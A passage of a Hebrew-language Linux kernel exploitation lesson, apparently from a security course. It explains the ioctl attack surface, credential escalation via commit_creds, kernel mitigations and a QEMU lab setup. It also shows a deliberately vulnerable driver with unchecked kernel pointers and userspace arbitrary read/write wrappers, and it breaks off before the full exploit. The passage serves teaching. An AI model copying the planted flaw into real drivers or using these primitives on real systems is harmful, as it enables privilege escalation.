+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="w">    </span><span class="p">.</span><span class="n">open</span><span class="w">           </span><span class="o">=</span><span class="w"> </span><span class="n">vuln_open</span><span class="p">,</span>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="w">    </span><span class="p">.</span><span class="n">read</span><span class="w">           </span><span class="o">=</span><span class="w"> </span><span class="n">vuln_read</span><span class="p">,</span>
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="w">    </span><span class="p">.</span><span class="n">write</span><span class="w">          </span><span class="o">=</span><span class="w"> </span><span class="n">vuln_write</span><span class="p">,</span>
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="w">    </span><span class="p">.</span><span class="n">unlocked_ioctl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">vuln_ioctl</span><span class="p">,</span><span class="w">   </span><span class="c1">// most of the vulnerability lives here</span>
+<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="p">};</span>
+</code></pre></div>
+<p>כשתהליך במרחב המשתמש קורא <code>ioctl(fd, cmd, arg)</code>, הkernel קורא ל-<code>vuln_ioctl</code> עם ה-<code>cmd</code> וה-<code>arg</code> שהמשתמש בחר. ה-<code>arg</code> הוא בדרך כלל מצביע למבנה במרחב המשתמש, והדרייבר מעתיק ממנו נתונים פנימה עם <code>copy_from_user</code> ומחזיר החוצה עם <code>copy_to_user</code>. שתי הפונקציות האלה הן קו הגבול: הן אמורות לוודא שהכתובת שהמשתמש נתן באמת שייכת למרחב המשתמש. כשדרייבר עוקף אותן, או משתמש בהן עם אורך או כתובת שהמשתמש שולט בהם בלי בדיקה, נולדת חולשה.</p>
+<hr />
+<h2 id="-attack-surface">משטח התקיפה - attack surface<a class="headerlink" href="#-attack-surface" title="Permanent link">&para;</a></h2>
+<p>בואו נסדר את התמונה. אלה הכניסות העיקריות שדרכן קלט של המשתמש מגיע לקוד ה-ring 0:</p>
+<ul>
+<li>קריאות מערכת - syscalls: הליבה עצמה. חולשות כאן נדירות יחסית כי הקוד נבדק היטב, אבל כשהן קיימות הן שוות זהב כי הן זמינות לכל תהליך. דוגמאות היסטוריות מפורסמות הן חולשות ב-<code>futex</code>, ב-<code>waitid</code> וב-<code>io_uring</code>.</li>
+<li>מטפלי ioctl - ioctl handlers: משטח התקיפה הכי עשיר. <code>ioctl</code> הוא בעצם "דלת אחורית" גנרית שבה כל דרייבר ממציא לעצמו פרוטוקול. מספרי הפקודות והארגומנטים מגיעים כולם מהמשתמש, והפרסור שלהם בדרייבר הוא מקור נדיב לבאגים.</li>
+<li>מנהלי התקן - device drivers: כל קובץ תחת <code>/dev</code>, וגם interfaces דרך <code>/proc</code> ו-<code>/sys</code>, netlink ו-eBPF. ככל שיש יותר קוד שמקבל קלט, יש יותר מקומות להיכשל.</li>
+</ul>
+<p>ההיגיון שמנחה חוקר kernel הוא: לחפש את הקוד שהכי הרבה קלט לא מהימן עובר דרכו, ושהכי פחות עיניים בדקו. דרייבר של יצרן חומרה מסוים, מודול ניסיוני, handler של ioctl עם עשרות פקודות - שם מתחבאים הבאגים.</p>
+<hr />
+<h2 id="kernel-exploit-">מה משיג kernel exploit - הסלמת הרשאות<a class="headerlink" href="#kernel-exploit-" title="Permanent link">&para;</a></h2>
+<p>אז מצאנו באג ואנחנו מריצים קוד או כותבים לזיכרון ב-ring 0. מה עושים עם זה? המטרה כמעט תמיד זהה: הסלמת הרשאות ל-root, כלומר privilege escalation. אנחנו מתחילים כמשתמש רגיל, וברצוננו להפוך לכל-יכולים.</p>
+<p>בלינוקס, ההרשאות של כל תהליך שמורות במבנה בשם <code>struct cred</code>, ובתוכו השדות <code>uid</code>, <code>gid</code>, <code>euid</code> וחבריהם. כל <code>task_struct</code> (המבנה שמתאר תהליך) מצביע ל-<code>cred</code> שלו. אם נצליח להפוך את ה-<code>uid</code> של התהליך שלנו ל-0, אנחנו root - כך פשוט.</p>
+<p>יש שתי דרכים עיקריות להגיע לזה:</p>
+<p>הדרך הראשונה, הקלאסית, היא לגרום לkernel לקרוא לשתי פונקציות שכבר קיימות בו:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">commit_creds</span><span class="p">(</span><span class="n">prepare_kernel_cred</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
+</code></pre></div>
+<p>הפונקציה <code>prepare_kernel_cred</code> בונה מבנה <code>cred</code> חדש עם הרשאות של root, ו-<code>commit_creds</code> מתקינה אותו כהרשאות של התהליך הנוכחי. שתי שורות, ואנחנו root. את הכתובות של הפונקציות האלה אפשר לשלוף (בסביבת מעבדה) מ-<code>/proc/kallsyms</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">&quot; (commit_creds|prepare_kernel_cred)</span>$<span class="s2">&quot;</span><span class="w"> </span>/proc/kallsyms
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="c1"># ffffffff810a9b40 T commit_creds</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="c1"># ffffffff810a9e30 T prepare_kernel_cred</span>
+</code></pre></div>
+<p>הערה חשובה לגרסאות מודרניות: החל מkernel 6.2, קריאה ל-<code>prepare_kernel_cred(0)</code> כבר לא מחזירה הרשאות root אלא הרשאות של משתמש חסר-פריבילגיה. במקום זאת צריך להעביר מצביע ל-<code>&amp;init_task</code>. בסביבות המעבדה שלנו נעבוד עם גרסאות kernel מעט ישנות יותר שבהן <code>prepare_kernel_cred(0)</code> עדיין עובד, אבל שווה לזכור את השינוי הזה כשתתקלו בkernel אמיתי.</p>
+<p>הדרך השנייה, שנוחה יותר כשיש לנו כתיבה שרירותית אבל לא שליטה על זרימת הבקרה, היא לדרוס את המשתנה הגלובלי <code>modprobe_path</code>. נחזור לזה בסוף השיעור כשנדבר על פרימיטיבים - זו טכניקת נתונים בלבד, שעוקפת חלק גדול מההגנות.</p>
+<p>יש עוד עדינות אחת שכדאי להזכיר: אחרי ששינינו את ההרשאות, אנחנו צריכים לחזור בשלום מ-ring 0 ל-ring 3 ולפתוח shell. חזרה נקייה לא טריוויאלית - צריך לשחזר רגיסטרים, לבצע <code>swapgs</code> ו-<code>iretq</code>, ולפעמים לעבור דרך trampoline מיוחד של הkernel. נצלול לזה בשיעור על ret2usr.</p>
+<hr />
+<h2 id="kernel-kernel-mitigations">מנגנוני הגנה בkernel - kernel mitigations<a class="headerlink" href="#kernel-kernel-mitigations" title="Permanent link">&para;</a></h2>
+<p>בדיוק כמו במרחב המשתמש, גם הkernel עטוף בשכבות הגנה. חלקן מקבילות למה שכבר מכירים וחלקן ייחודיות ל-ring 0. הנה המפה:</p>
+<table>
+<thead>
+<tr>
+<th>מנגנון</th>
+<th>מה הוא עושה</th>
+<th>מה הוא שובר לנו</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>אקראיות מרחב הkernel - KASLR</td>
+<td>ממקם את בסיס הkernel בכתובת אקראית בכל אתחול</td>
+<td>שימוש בכתובות קבועות של פונקציות ומבנים</td>
+</tr>
+<tr>
+<td>מניעת הרצה בפיקוח - SMEP</td>
+<td>המעבד מסרב להריץ דפי משתמש בזמן ריצה ב-ring 0</td>
+<td>ret2usr - קפיצה לקוד שלנו במרחב המשתמש</td>
+</tr>
+<tr>
+<td>מניעת גישה בפיקוח - SMAP</td>
+<td>המעבד מסרב לקרוא/לכתוב דפי משתמש מ-ring 0</td>
+<td>קריאת מבני נתונים שהכנו במרחב המשתמש</td>
+</tr>
+<tr>
+<td>בידוד טבלאות הדפים - KPTI</td>
+<td>טבלאות דפים נפרדות לkernel ולמשתמש</td>
+<td>חזרה פשוטה ל-userland, דורש trampoline</td>
+</tr>
+<tr>
+<td>הcanary על המחסנית - stack canary</td>
+<td>ערך אקראי לפני return address במחסנית הkernel</td>
+<td>overflow מחסנית קלאסית בתוך הkernel</td>
+</tr>
+</tbody>
+</table>
+<p>ושתי הגדרות רכות יותר ששולטות בכמה מידע דולף החוצה:</p>
+<ul>
+<li>הגבלת מצביעי kernel - kptr_restrict: כשהיא דולקת, כתובות kernel ב-<code>/proc/kallsyms</code> ובinterfaces אחרים מוסתרות ומוצגות כאפסים. זה מקשה עלינו לדעת לאן לקפוץ.</li>
+<li>הגבלת יומן הkernel - dmesg_restrict: כשהיא דולקת, משתמש רגיל לא יכול לקרוא את <code>dmesg</code>. חשוב כי יומן הkernel דולף לפעמים כתובות בהודעות שגיאה, ובכך מפיל את KASLR.</li>
+</ul>
+<p>הנקודה החשובה זהה למה שראינו במרחב המשתמש: אף הגנה בודדת לא עוצרת הכל, והן עובדות בשכבות. KASLR נשבר על ידי leak כתובת. SMEP ו-SMAP נשברים על ידי מעבר לטכניקות ROP או טכניקות נתונים בלבד במקום קפיצה לקוד שלנו. כל exploit אמיתי הוא chain של עקיפות, אחת אחרי השנייה.</p>
+<p>בבדיקות שלנו כדאי לדעת איך לבדוק ולכבות את ההגנות בסביבת מעבדה:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># check KASLR and SMEP/SMAP from inside the VM</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>cat<span class="w"> </span>/proc/cmdline
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>grep<span class="w"> </span>-o<span class="w"> </span><span class="s1">&#39;smep\|smap&#39;</span><span class="w"> </span>/proc/cpuinfo<span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-u
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="c1"># in QEMU&#39;s boot file: adding nokaslr disables KASLR</span>
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="c1"># and removing +smep,+smap from the cpu flag disables them</span>
+</code></pre></div>
+<hr />
+<h2 id="-qemu-vulnerable">סביבת המעבדה - QEMU ומודול vulnerable<a class="headerlink" href="#-qemu-vulnerable" title="Permanent link">&para;</a></h2>
+<p>בניגוד לexploit userland, פה אנחנו לא רוצים להתאמן על הkernel האמיתי של המכונה שלנו - טעות קטנה מפילה את כל המערכת, ואולי גם משחיתה את דיסק. לכן כל מחקר kernel נעשה בתוך מכונה וירטואלית, ובמעבדה שלנו נשתמש ב-QEMU. היתרון הגדול: אפשר לקרוס כמה שרוצים, ואפשר לחבר GDB ישירות למכונה הוירטואלית ולראות את הkernel מבפנים.</p>
+<p>הרכיבים של סביבת המעבדה:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>+---------------------------------------------------+
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>|                    QEMU VM                        |
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>|                                                     |
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>|   bzImage      = the kernel image being loaded     |
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>|                  (known version)                   |
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>|   rootfs.cpio  = small filesystem (initramfs)      |
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>|   vuln.ko      = the vulnerable module loaded       |
+<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>|                  into the kernel                    |
+<a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>|                                                     |
+<a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>|   our exploit sits inside rootfs, statically        |
+<a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a>|   compiled                                          |
+<a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a>+---------------------------------------------------+
+<a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a>        ^                              ^
+<a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a>        | -kernel bzImage              | -s  (GDB stub on :1234)
+<a id="__codelineno-7-15" name="__codelineno-7-15" href="#__codelineno-7-15"></a>        | -initrd rootfs.cpio          |
+</code></pre></div>
+<p>סקריפט הרצה טיפוסי נראה כך:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>qemu-system-x86_64<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="w">    </span>-m<span class="w"> </span>128M<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="w">    </span>-kernel<span class="w"> </span>./bzImage<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="w">    </span>-initrd<span class="w"> </span>./rootfs.cpio<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="w">    </span>-append<span class="w"> </span><span class="s2">&quot;console=ttyS0 nokaslr quiet oops=panic panic=1&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="w">    </span>-cpu<span class="w"> </span>qemu64,+smep,+smap<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="w">    </span>-nographic<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="w">    </span>-s
+</code></pre></div>
+<p>הדגל <code>-s</code> פותח שרת GDB על פורט 1234, כך שאפשר לחבר אליו מהמארח. שימו לב לדגלים בתוך <code>-append</code>: <code>nokaslr</code> מכבה את KASLR כדי שנתחיל ללמוד עם כתובות קבועות, ואת <code>+smep,+smap</code> אפשר להוריד מ-<code>-cpu</code> כשרוצים סביבה נוחה יותר. ככל שנתקדם נדליק את ההגנות אחת-אחת.</p>
+<p>חיבור מנפה מהמארח, כשיש לנו <code>vmlinux</code> (הגרסה הלא-דחוסה עם סימבולים):</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>gdb<span class="w"> </span>./vmlinux
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>target<span class="w"> </span>remote<span class="w"> </span>:1234
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="k">break</span><span class="w"> </span>vuln_ioctl
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="k">continue</span>
+</code></pre></div>
+<p>וכדי לנפות את המודול vulnerable עצמו, שולפים את כתובת הטעינה שלו מתוך המכונה ומוסיפים את הסימבולים ב-GDB:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c1"># inside the virtual machine (as root, for learning purposes)</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>cat<span class="w"> </span>/sys/module/vuln/sections/.text
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="c1"># 0xffffffffc0000000</span>
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="c1"># in GDB on the host</span>
+<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>add-symbol-file<span class="w"> </span>vuln.ko<span class="w"> </span>0xffffffffc0000000
+</code></pre></div>
+<p>עכשיו נסתכל על הלב של המעבדה - המודול vulnerable. זה מנהל התקן תווים עם handler של <code>ioctl</code> שמעתיק זיכרון לפי כתובת ואורך שהמשתמש נותן, בלי שום בדיקה שהכתובת שייכת למרחב המשתמש:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="cp">#define VULN_READ  0x1000</span>
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="cp">#define VULN_WRITE 0x1001</span>
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="k">struct</span><span class="w"> </span><span class="nc">vuln_req</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="w">    </span><span class="kt">void</span><span class="w">   </span><span class="o">*</span><span class="n">uptr</span><span class="p">;</span><span class="w">   </span><span class="c1">// address in userspace</span>
+<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="w">    </span><span class="kt">void</span><span class="w">   </span><span class="o">*</span><span class="n">kptr</span><span class="p">;</span><span class="w">   </span><span class="c1">// address in the kernel - the attacker controls it!</span>
+<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a><span class="w">    </span><span class="kt">size_t</span><span class="w">  </span><span class="n">len</span><span class="p">;</span><span class="w">    </span><span class="c1">// length - the attacker controls it!</span>
+<a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a><span class="p">};</span>
+<a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>
+<a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a><span class="k">static</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="nf">vuln_ioctl</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">file</span><span class="w"> </span><span class="o">*</span><span class="n">f</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">cmd</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">arg</span><span class="p">)</span>
+<a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a><span class="p">{</span>
+<a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a><span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">vuln_req</span><span class="w"> </span><span class="n">req</span><span class="p">;</span>
+<a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a>
+<a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">req</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">req</span><span class="p">)))</span>
+<a id="__codelineno-11-15" name="__codelineno-11-15" href="#__codelineno-11-15"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
+<a id="__codelineno-11-16" name="__codelineno-11-16" href="#__codelineno-11-16"></a>
+<a id="__codelineno-11-17" name="__codelineno-11-17" href="#__codelineno-11-17"></a><span class="w">    </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-11-18" name="__codelineno-11-18" href="#__codelineno-11-18"></a><span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">VULN_READ</span><span class="p">:</span><span class="w">   </span><span class="c1">// arbitrary read: kptr -&gt; uptr</span>
+<a id="__codelineno-11-19" name="__codelineno-11-19" href="#__codelineno-11-19"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">copy_to_user</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">uptr</span><span class="p">,</span><span class="w"> </span><span class="n">req</span><span class="p">.</span><span class="n">kptr</span><span class="p">,</span><span class="w"> </span><span class="n">req</span><span class="p">.</span><span class="n">len</span><span class="p">))</span>
+<a id="__codelineno-11-20" name="__codelineno-11-20" href="#__codelineno-11-20"></a><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
+<a id="__codelineno-11-21" name="__codelineno-11-21" href="#__codelineno-11-21"></a><span class="w">        </span><span class="k">break</span><span class="p">;</span>
+<a id="__codelineno-11-22" name="__codelineno-11-22" href="#__codelineno-11-22"></a><span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">VULN_WRITE</span><span class="p">:</span><span class="w">  </span><span class="c1">// arbitrary write: uptr -&gt; kptr</span>
+<a id="__codelineno-11-23" name="__codelineno-11-23" href="#__codelineno-11-23"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">copy_from_user</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">kptr</span><span class="p">,</span><span class="w"> </span><span class="n">req</span><span class="p">.</span><span class="n">uptr</span><span class="p">,</span><span class="w"> </span><span class="n">req</span><span class="p">.</span><span class="n">len</span><span class="p">))</span>
+<a id="__codelineno-11-24" name="__codelineno-11-24" href="#__codelineno-11-24"></a><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
+<a id="__codelineno-11-25" name="__codelineno-11-25" href="#__codelineno-11-25"></a><span class="w">        </span><span class="k">break</span><span class="p">;</span>
+<a id="__codelineno-11-26" name="__codelineno-11-26" href="#__codelineno-11-26"></a><span class="w">    </span><span class="k">default</span><span class="o">:</span>
+<a id="__codelineno-11-27" name="__codelineno-11-27" href="#__codelineno-11-27"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
+<a id="__codelineno-11-28" name="__codelineno-11-28" href="#__codelineno-11-28"></a><span class="w">    </span><span class="p">}</span>
+<a id="__codelineno-11-29" name="__codelineno-11-29" href="#__codelineno-11-29"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<a id="__codelineno-11-30" name="__codelineno-11-30" href="#__codelineno-11-30"></a><span class="p">}</span>
+</code></pre></div>
+<p>הבאג עדין אבל קטלני: הדרייבר מאמין ל-<code>req.kptr</code>. הוא אמור לגעת רק בכתובות של הkernel שהוא עצמו הקצה, אבל הוא נותן למשתמש להצביע לכל כתובת kernel שירצה. <code>copy_to_user</code> מוודאת שה-<code>uptr</code> תקין, אבל אף אחד לא בודק את ה-<code>kptr</code>. וזה כל מה שאנחנו צריכים.</p>
+<hr />
+<h2 id="-arbitrary-readwrite">הפרימיטיבים שאנחנו רודפים אחריהם - arbitrary read/write<a class="headerlink" href="#-arbitrary-readwrite" title="Permanent link">&para;</a></h2>
+<p>כל kernel exploit, בסופו של דבר, בנוי משני אבני בניין שאנחנו שואפים אליהן: קריאה שרירותית - arbitrary read - היכולת לקרוא כל כתובת בזיכרון הkernel, וכתיבה שרירותית - arbitrary write - היכולת לכתוב לכל כתובת. אם יש לנו את שתיהן, השאר זו כבר עבודת נמלים.</p>
+<p>מהמודול שלמעלה אנחנו מקבלים את שני הפרימיטיבים כמעט חינם. הנה עטיפה נוחה במרחב המשתמש:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;fcntl.h&gt;</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/ioctl.h&gt;</span>
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdint.h&gt;</span>
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>
+<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="cp">#define VULN_READ  0x1000</span>
+<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="cp">#define VULN_WRITE 0x1001</span>
+<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>
+<a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a><span class="k">struct</span><span class="w"> </span><span class="nc">vuln_req</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">uptr</span><span class="p">;</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">kptr</span><span class="p">;</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">len</span><span class="p">;</span><span class="w"> </span><span class="p">};</span>
+<a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>
+<a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">;</span>
+<a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a>
+<a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a><span class="kt">uint64_t</span><span class="w"> </span><span class="nf">kread64</span><span class="p">(</span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">kaddr</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a><span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">out</span><span class="p">;</span>
+<a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a><span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">vuln_req</span><span class="w"> </span><span class="n">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="o">&amp;</span><span class="n">out</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">kaddr</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="w"> </span><span class="p">};</span>
+<a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a><span class="w">    </span><span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">VULN_READ</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">r</span><span class="p">);</span>
+<a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">out</span><span class="p">;</span>
+<a id="__codelineno-12-17" name="__codelineno-12-17" href="#__codelineno-12-17"></a><span class="p">}</span>
+<a id="__codelineno-12-18" name="__codelineno-12-18" href="#__codelineno-12-18"></a>
+<a id="__codelineno-12-19" name="__codelineno-12-19" href="#__codelineno-12-19"></a><span class="kt">void</span><span class="w"> </span><span class="nf">kwrite64</span><span class="p">(</span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">kaddr</span><span class="p">,</span><span class="w"> </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">val</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-12-20" name="__codelineno-12-20" href="#__codelineno-12-20"></a><span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">vuln_req</span><span class="w"> </span><span class="n">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="o">&amp;</span><span class="n">val</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">kaddr</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="w"> </span><span class="p">};</span>
+<a id="__codelineno-12-21" name="__codelineno-12-21" href="#__codelineno-12-21"></a><span class="w">    </span><span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">VULN_WRITE</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">r</span><span class="p">);</span>
+<a id="__codelineno-12-22" name="__codelineno-12-22" href="#__codelineno-12-22"></a><span class="p">}</span>
+</code></pre></div>
+<p>ומה עושים עם <code>kread64</code> ו-<code>kwrite64</code>? זה בדיוק ה-pipeline של כל kernel exploit, ונפרק אותו לשלושה שלבים שנעבור עליהם לעומק בשיעורים הבאים:</p>
